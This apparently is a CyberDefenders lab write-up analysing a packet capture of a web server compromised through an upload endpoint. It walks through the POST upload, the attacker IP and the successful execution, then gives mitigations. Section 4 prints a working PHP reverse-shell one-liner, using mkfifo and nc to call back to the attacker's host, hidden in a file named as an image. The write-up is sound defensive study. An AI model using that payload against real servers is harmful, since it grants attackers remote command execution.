# WebStrike Incident Analysis – CyberDefenders

## Scenario

A suspicious file was identified on a company web server, raising concerns of potential malicious activity. Network traffic was captured in a PCAP file to determine how the file appeared and assess the extent of unauthorized activity.

---

## Objective

* Determine how the suspicious file was introduced
* Identify any unauthorized or malicious activity

---

## Investigation Summary

### 1. Initial Traffic Analysis

![Initial Traffic](screenshots/01_initial_traffic.png)

**Observation:** Communication observed between:

* External IP: 117.11.88.124
* Web Server: 24.49.63.79

**Insight:** External system interacting directly with the web server.

---

### 2. HTTP Traffic Identification

![HTTP Activity](screenshots/02_http_activity.png)

**Observation:** HTTP traffic revealed requests to `/reviews/` endpoints.

**Insight:** Indicates interaction with a web application component.

---

### 3. File Upload Discovery (ENTRY POINT)

![File Upload](screenshots/03_file_upload.png)

**Observation:**

```http
POST /reviews/upload.php
```

**Insight:**
The suspicious file was introduced via an HTTP POST request to the upload endpoint, indicating a file upload mechanism.

---

### 4. Payload Analysis (HOW THE ATTACK WORKED)

![Payload](screenshots/04_payload_analysis.png)

**Observation:**

```php
filename="image.jpg.php"
```

Payload:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
```

**Insight:**
The attacker uploaded a malicious PHP reverse shell disguised as an image file, enabling remote command execution.

---

### 5. Attacker Identification

![Attacker IP](screenshots/05_attacker_ip.png)

**Observation:**
Source IP: **117.11.88.124**

**Insight:**
This IP is responsible for initiating the malicious activity.

---

### 6. Execution of Malicious File (IMPACT)

![Execution](screenshots/06_execution.png)

**Observation:**

```http
GET /reviews/uploads/image.jpg.php
→ HTTP/1.1 200 OK
```

**Insight:**
The uploaded file was successfully accessed and executed, confirming compromise.

---

## Final Findings (Direct Answer to Scenario)

### How did the file appear?

The suspicious file was uploaded through an exposed file upload endpoint (`/reviews/upload.php`). The attacker used an HTTP POST request to upload a malicious PHP file disguised as an image (`image.jpg.php`), exploiting insufficient file validation.

### What unauthorized activity occurred?

The uploaded file contained a reverse shell payload, allowing the attacker to execute commands remotely. The file was later accessed successfully (HTTP 200 OK), confirming execution and indicating full compromise of the web server.

---

## Impact Assessment

* Remote code execution achieved
* Web server fully compromised
* Attacker gained potential shell access

---

## Mitigation Recommendations

* Restrict file uploads to safe formats only
* Block execution of uploaded files
* Validate file types using server-side checks
* Implement Web Application Firewall (WAF)
* Monitor abnormal POST request patterns

---

## Note

Flags and challenge answers are intentionally omitted in accordance with CyberDefenders guidelines.
